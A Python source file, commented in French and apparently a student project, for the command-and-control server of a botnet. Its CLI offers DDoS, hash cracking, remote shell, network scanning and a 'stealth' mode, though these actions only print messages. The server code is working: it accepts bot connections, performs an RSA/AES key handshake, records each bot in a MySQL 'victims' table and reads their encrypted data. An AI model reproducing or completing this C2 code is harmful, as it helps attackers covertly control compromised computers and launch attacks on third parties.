import socket
from env import *
import threading
import argparse
from queue import Queue, Empty
import select
import base64
import mysql.connector
import sys
import rsa

import json
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes




# Fonctions



def handle_client(host, port, queue):
    running = True

    while running:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))
            s.listen()
            print("ecoute sur : " + str(host) + ":" + str(port))
            conn, addr = s.accept()
        

        return conn, addr


def emission(queue, conn, addr):

    running = True
    while running:
        message = queue.get()

        if message == 'stop-thread':
            running = False
            print("stopping emission thread on ip " + str(addr))
        else:
            conn.sendall(message)
            # print("data sent to " + str(addr))


def reception(queue, conn, addr):

    running = True
    while running:
        data = conn.recv(1024)
        if not data:
            running = False
            print("stopping reception thread on ip " + str(addr))
        else:
            queue.put(data)
            print("data received from " + str(addr))


# Fin fonctions



# Arguments
# -h, --help            montre le message d'aide
# -a, --action          permet de sélectionner une action (ex: "ddos", "scan", "shell", "endpoint", "keylogger", "screenshot", "decrypt", "download", "crypto")
# -s, --stop            permet de stopper l'action en cours
# -g, --group           permet de sélectionner un groupe d'ordinateur. Pour séléctionner plusieurs groupes, il faut les séparer par des virgules (ex: "ESGI,PARIS")
# -h, --host            permet de sélectionner un ordinateur. Pour séléctionner plusieurs hosts, il faut les séparer par des virgules (ex: "10.10.10.10,12.12.12.12")
# -lg, --list-group     montre la liste des groupes ordinateurs
# -lh, --list-host      montre la liste des ordinateurs
# -cg, --create-group   créer un groupe d'ordinateurs
# -dg, --delete-group   supprime un groupe d'ordinateur

# python3 main.py -g ESGI,PARIS -a ddos 10.11.12.13
# python3 main.py -h 10.10.10.10 -a shell

# python3 main.py -cg ESGI 100.100.100.100,13.13.13.13


parser = argparse.ArgumentParser()

# Groupe mutuellement exclusif pour les attaques
action_group = parser.add_mutually_exclusive_group()

# Démarrage du serveur
action_group.add_argument("--start", action="store_true", help="démarre le serveur")

# Arguments spécifiques à l'attaque DDoS
action_group.add_argument("--ddos", action="store_true", help="lance une attaque ddos sur un ordinateur")

# Arguments spécifiques à l'attaque de crack
action_group.add_argument("--crack", action="store_true", help="lance une attaque de crack sur un ordinateur")

# Lance un shell sur une machine précise
action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--endpoint", action="store_true", help="Lance une connexion VPN sur une machine précise")

# Lance un VPN sur une machine précise
action_group.add_argument("--scan", action="store_true", help="Scan le réseau d'une machine précise ou d'un groupe")

# Active/désactive le mode discretion
action_group.add_argument("--stealth", action="store_true",  help="Active le mode discretion sur une ou plusieurs machines. Limite l'utilisation de l'ordinateur")
action_group.add_argument("--no-stealth", action="store_true",  help="Désactive le mode discretion sur une ou plusieurs machines. Enlève la limite d'utilisation de l'ordinateur")

# Active/désactive le mode multi-task
action_group.add_argument("--multi-task", action="store_true",  help="Active le mode multi-task sur une ou plusieurs machines. Permet de lancer plusieurs taches en même temps")
action_group.add_argument("--no-multi-task", action="store_true",  help="Désactive le mode multi-task sur une ou plusieurs machines. Limite les taches à une seule à la fois")

# Arguments pour les différentes attaques
parser.add_argument("--port", type=int, help="démarre le serveur sur le port suivant")
parser.add_argument("--address", type=str, help="adresse ip de l'ordinateur à attaquer")
parser.add_argument("--time", type=int, help="temps de l'attaque ddos en seconde")
parser.add_argument("--hash", type=str, help="hash à cracker")
parser.add_argument("--wordlist", type=str, help="wordlist")


# Gestion des groupes
action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
action_group.add_argument("--list-group", type=str, help="Montre la liste des groupes d'ordinateurs")
action_group.add_argument("--create-group", nargs=2, type=str, help="Créer un groupe d'ordinateurs")
action_group.add_argument("--delete-group", type=str, help="Supprime un groupe d'ordinateurs")


# Groupe mutuellement exclusif pour la sélection du groupe ou de l'ordinateur
group_or_host = parser.add_mutually_exclusive_group()
group_or_host.add_argument("-G", "--group", type=str, help="permet de sélectionner un groupe d'ordinateur. Pour sélectionner plusieurs groupes, il faut les séparer par des virgules (ex: 'ESGI,PARIS')")
group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionner un ordinateur. Pour sélectionner plusieurs hosts, il faut les séparer par des virgules")




args = parser.parse_args()

if args.ddos:
    if not args.address or not args.time:
        parser.error("--ddos nécessite les arguments --address et --time")
    elif not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")

    print("ddos sur " + args.address + " pendant " + args.time + " secondes")


elif args.crack:
    if not args.hash or not args.wordlist:
        parser.error("--crack nécessite les arguments --hash et --wordlist")
    elif not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")

    print("crack du hash '" + args.hash + "' avec la wordlist " + args.wordlist)


elif args.shell:
    if args.group:
        parser.error("--shell n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--shell nécessite l'argument --host")
    print("shell sur " + args.host)


elif args.endpoint:
    if args.group:
        parser.error("--endpoint n'accepte pas l'argument --group")
    elif not args.host:
        parser.error("--endpoint nécessite l'argument --host")
    print("connexion VPN sur " + args.host)


elif args.scan:
    if not args.host and not args.group:
        parser.error("--scan nécessite l'argument --host et/ou --group")
    print("scan sur " + args.host + " et/ou " + args.group)


elif args.stealth:
    if not args.host and not args.group:
        parser.error("--stealth nécessite l'argument --host et/ou --group")
    elif args.no_stealth:
        parser.error("--stealth et --no-stealth sont mutuellement exclusifs")
    print("activation du mode stealth sur " + args.host + " et/ou " + args.group)


elif args.no_stealth:
    if not args.host and not args.group:
        parser.error("--no-stealth nécessite l'argument --host et/ou --group")
    elif args.stealth:
        parser.error("--no-stealth et --stealth sont mutuellement exclusifs")
    print("désactivation du mode stealth sur " + args.host + " et/ou " + args.group)


elif args.multi_task:
    if not args.host and not args.group:
        parser.error("--multi-task nécessite l'argument --host et/ou --group")
    elif args.no_multi_task:
        parser.error("--multi-task et --no-multi-task sont mutuellement exclusifs")
    print("activation du mode multi-task sur " + args.host + " et/ou " + args.group)


elif args.no_multi_task:
    if not args.host and not args.group:
        parser.error("--no-multi-task nécessite l'argument --host et/ou --group")
    elif args.multi_task:
        parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
    print("désactivation du mode multi-task sur " + args.host + " et/ou " + args.group)


elif args.list_host:
    if args.host:
        parser.error("--list-host n'accepte pas l'argument --host")
    elif args.group:
        print("liste des ordinateurs du groupe " + args.group)
    else:
        print("liste des ordinateurs du botnet")


elif args.list_group:
    if args.host or args.group:
        parser.error("--list-group n'accepte pas les arguments --host et --group")
    else:
        print("liste des groupes d'ordinateurs")


elif args.create_group:
    if args.host or args.group:
        parser.error("--create-group n'accepte pas les arguments --host et --group")
    else:
        print("création du groupe " + args.create_group[0] + " avec les ordinateurs " + args.create_group[1])


elif args.delete_group:
    if args.host or args.group:
        parser.error("--delete-group n'accepte pas les arguments --host et --group")
    else:
        print("suppression du groupe " + args.delete_group)


elif args.start:
    if not args.port or args.port < 1023 or args.port > 65535:
        parser.error("--start nécessite l'argument --port compris entre 1023 et 65535")
    else:
        print("démarrage du serveur sur le port " + str(args.port))


        #(addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv)
        clients = []

        # Socket
        host = "127.0.0.1"
        port = args.port

        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_server.setblocking(0)
        socket_server.bind((host, port))
        socket_server.listen()
        print("ecoute sur : " + str(host) + ":" + str(port))


        connection_list = [socket_server]

        # Database
        db = mysql.connector.connect(
            host=DBHOST,
            user=DBUSER,
            password=DBPASSWORD,
            database=DB
        )


        mycursor = db.cursor()

        running = True


        while running:
            # print("running")
            # print(connection_list)

            read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)


            # print("read_sockets : " + str(read_sockets))

            for sock in read_sockets:
                # Nouvelle connexion
                if sock is socket_server:
                    conn, addr = sock.accept()

                    # Création des threads d'émission et de réception
                    emission_queue = Queue()
                    thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
                    thread_emission.start()

                    reception_queue = Queue()
                    thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
                    thread_reception.start()

                    # Handshake
                    print("handshake with " + str(addr))

                    # Récupération de la clé publique du client
                    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
                    # print("public key : " + str(public_key))

                    # Génération de la clé symétrique
                    sym_key = get_random_bytes(16)
                    iv = get_random_bytes(16)
                    # print("symetric key : " + str(sym_key))
                    # print("iv : " + str(iv))

                    json_conf = '{"action":"' + base64.b64encode("client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(sym_key).decode() + '","b64iv":"' + base64.b64encode(iv).decode() + '","multithread":true,"stealth":true}'

                    # Chiffrement de la data avec la clé publique du client
                    encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                    # Envoi de la clé symétrique chiffrée
                    emission_queue.put(encrypted_sym_key)

                    # print("[+] Waiting for client handshake informations")

                    received_data = reception_queue.get()

                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                    pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                    # print("received data : " + str(pt))

                    # Récupération de l'uid client
                    uid = json.loads(pt)["uid"]

                    # Vérification de l'uid dans la base de données
                    query = "SELECT * FROM victims WHERE uid = %s"
                    values = (uid,)

                    mycursor.execute(query, values)

                    myresult = mycursor.fetchall()

                    if len(myresult) > 0:
                        # print("client already in the database")
                        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
                        values = (addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)

                        mycursor.execute(query, values)

                    else:
                        # print("client not in the database")
                        # Ajout du client à la base de données

                        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
                        values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)

                        mycursor.execute(query, values)

                    db.commit()

                    # Ajout du client à la liste des clients
                    clients.append(dict(uid = uid, 
                                        addr = addr, 
                                        conn = conn, 
                                        thread_emission = thread_emission, 
                                        emission_queue = emission_queue, 
                                        thread_reception = thread_reception, 
                                        reception_queue = reception_queue, 
                                        sym_key = sym_key, 
                                        iv = iv
                                    ))


            
            for client in clients:
                # Récupération des attaques de groupe à lancer
            

                # Récupération des attaques individuelles à lancer
                
                    


                # Récupération des données clients
                try:
                    encrypted_data_received = client['reception_queue'].get_nowait()

                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                    pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

                    print(client['addr'])
                    print("received data : " + str(pt))

                except Empty:
                    pass
                    





















else :
    parser.error("no action specified. Use -h/--help for help")